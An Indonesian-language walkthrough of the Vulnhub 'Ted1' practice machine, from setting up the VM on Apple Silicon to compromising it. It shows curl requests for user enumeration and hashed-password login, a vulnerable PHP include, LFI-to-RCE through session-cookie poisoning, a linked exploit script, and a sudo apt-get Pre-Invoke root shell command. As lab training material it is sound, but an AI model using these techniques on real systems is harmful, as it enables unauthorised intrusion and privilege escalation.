---
title: "Vulnhub Ted1 [OSWE/OSCP/ECPPT-Prep]"
date: 2026-04-18T09:31:48+07:00
showtoc: true
tocopen: true
---

Menurut saya, mesin ini gabungan dari web (oswe) dan pentest (oscp,ecppt) dimana foothold dari web dan privilege escalation dari mesin linux

Download mesin dari [https://www.vulnhub.com/entry/ted-1,327/](https://www.vulnhub.com/entry/ted-1,327/)

# Compile x86\_64 to Apple Silicon[#](#compile-x86_64-to-apple-silicon)


## install qemu
Install qemu    
```
$ brew install qemu
$ qemu-system-x86_64 --version
``` 

![qemu version](/img/Vulnhub-Ted1/qemu-version.png)

## convert OVA to QCOW2
Lakukan ekstrak file kemudian convert file vmdk ke qcow2
```
$ qemu-img convert -O qcow2 ted.vmdk ted.qcow2
``` 

## virtualization using UTM

Download dari [https://getutm.app/](https://getutm.app/) atau dari [https://github.com/utmapp/UTM/releases](https://github.com/utmapp/UTM/releases) kemudian pilih ’emulate' ![emulate UTM](/img/Vulnhub-Ted1/UTM-start.png) Lalu bagian
```
'Operating System' pilih 'Other' 
'Hardware' pilih 'x86_x64' 
'Memory' set default '4096' 
'Boot Device' set ke 'None'
``` 

Setelah selesai create, lakukan ‘Edit’ lalu masuk ke
```
section 'Drives' lalu 'Delete' bawaan 'IDE Drive' dan 'New' pilih 'Import' file QCOW2 yang sudah diconvert  
section 'QEMU' pilih unchecklist 'UEFI Boot'
``` 

# Weak credentials and details error/response leads to account takeover

Akses web didapatkan login file ![index page](/img/Vulnhub-Ted1/index.png)

Saat submit form didapatkan body request dan endpoint ![submit form](/img/Vulnhub-Ted1/request-burp.png)

Dari hasil response didapatkan bisa enumerasi valid user, saat mengganti user admin didapatkan response
```
    $ curl --path-as-is -i -s -k -X $'POST' \
        -H $'Host: 192.168.64.4' -H $'Content-Type: application/x-www-form-urlencoded' \
        --data-binary $'username=admin&password=wkwk' \
        $'http://192.168.64.4/authenticate.php'
    HTTP/1.1 302 Found
    Date: Thu, 02 Apr 2026 14:34:27 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Set-Cookie: PHPSESSID=se4vgt0p0to54nbh9bqbutnk76; path=/
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Location: index.php
    Content-Length: 84
    Content-Type: text/html; charset=UTF-8
        
    <p>Password or password hash is not correct, make sure to hash it before submit.</p> 
```

Gunakan weak password
```
admin:admin 
``` 

Didapatkan perbedaan response
```
    $ curl --path-as-is -i -s -k -X $'POST' \
        -H $'Host: 192.168.64.4' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 29' \
        --data-binary $'username=admin&password=admin' \
        $'http://192.168.64.4/authenticate.php'
    HTTP/1.1 302 Found
    Date: Thu, 02 Apr 2026 14:37:21 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Set-Cookie: PHPSESSID=2pand25rpkj1dihv7d3cll4a85; path=/
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Location: index.php
    Content-Length: 72
    Content-Type: text/html; charset=UTF-8
    
    <p>Password hash is not correct, make sure to hash it before submit.</p>
``` 

Berdasarkan hasil response, value password harus bentuk hash. Permasalahannya adalah tidak tau memakai hash apa. Lakukan percobaan dengan SHA256, MD5, dan SHA1 ![possible hash](/img/Vulnhub-Ted1/possible-hash.png)

Penulis generate hash menggunakan ini [https://emn178.github.io/online-tools/](https://emn178.github.io/online-tools/)
```
admin -> plaintext
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 -> hash admin lowercase
``` 

Didapatkan gagal
```
    $ curl --path-as-is -i -s -k -X $'POST' \
        -H $'Host: 192.168.64.4' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 88' \
        --data-binary $'username=admin&password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' \
        $'http://192.168.64.4/authenticate.php'
    HTTP/1.1 302 Found
    Date: Thu, 02 Apr 2026 14:43:57 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Set-Cookie: PHPSESSID=5nua4hnrgkevf786hjoingp010; path=/
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Location: index.php
    Content-Length: 84
    Content-Type: text/html; charset=UTF-8
    
    <p>Password or password hash is not correct, make sure to hash it before submit.</p>    
``` 

Kemudian saat set uppercase
```
admin -> plaintext
8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918 -> hash admin uppercase
``` 

Didapatkan berhasil
```
    $ curl --path-as-is -i -s -k -X $'POST' \
        -H $'Host: 192.168.64.4' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 88' \
        --data-binary $'username=admin&password=8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918' \
        $'http://192.168.64.4/authenticate.php'
    HTTP/1.1 302 Found
    Date: Thu, 02 Apr 2026 14:45:45 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Set-Cookie: PHPSESSID=re5m577q9n9mctdmip62j24js5; path=/
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Set-Cookie: PHPSESSID=o4j4div0oims5hgj4620ga4pr3; path=/
    Set-Cookie: user_pref=%2F; expires=Sat, 02-May-2026 14:45:45 GMT; Max-Age=2592000; path=/
    Location: home.php
    Content-Length: 0
    Content-Type: text/html; charset=UTF-8
```

Kemudian login terdapat search input yang rentan terhadap local file inclusion (LFI) ![LFI](/img/Vulnhub-Ted1/lfi.png)

Kemudian menggunakan referensi dari [https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a](https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a)
```
Using Wrappers:
expect:// -> false
php://filter -> success retrieve code Home.php
data:// -> false
    
Using Server:
/proc/self/environ -> false
    
Other Method:
Logs -> false
Sessions -> success
``` 

Pada Home.php terdapat potongan kode
```
    <?php 
                                            if (isset($_POST['search'])) {
                                                    echo "Showing results for ".$_POST['search'].":";
                                                    echo "<br>";
                                                    echo "<br>";
                                                    echo "<br>";
                                                    echo "<br>";
                                                    echo "<br>";
                                                    echo "<br>";
                                                    echo "<br>";
                                                    echo "<br>";
                                            } 
                                            include($_POST['search']);
                                    ?>
``` 

Setelah dilakukan skenario command injection didapatkan false positive :(

Idenya yaitu dengan session, pertama sesuaikan path dengan session
```
    /var/lib/php/sessions/sess_<SESSIONFROMBODYREQUEST>
```

![normal session](/img/Vulnhub-Ted1/normal-session.png)

Kemudian setelah dicoba dengan overwrite field name gagal, setelah melihat dari normal request field user\_pref merupakan controllable input lalu ganti value user\_pref ke php code rce didapatkan berhasil ![success rce](/img/Vulnhub-Ted1/success-rce.png)

Untuk script akses [disini](https://github.com/ahm4ddm/oswe-preparation/blob/main/exp-ted1.py)

Didapatkan berhasil reverse shell ![revshell](/img/Vulnhub-Ted1/revshell.png)

# Privilege escalation through misconfig sudoers - apt-get

Lakukan pengecekan dengan    
```
sudo -l 
``` 

Didapatkan misconfig binary apt-get dengan memanfaatkan misconfig ini didapatkan eskalasi ke user tertinggi yaitu root
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```   

![privesc](/img/Vulnhub-Ted1/privesc.png)
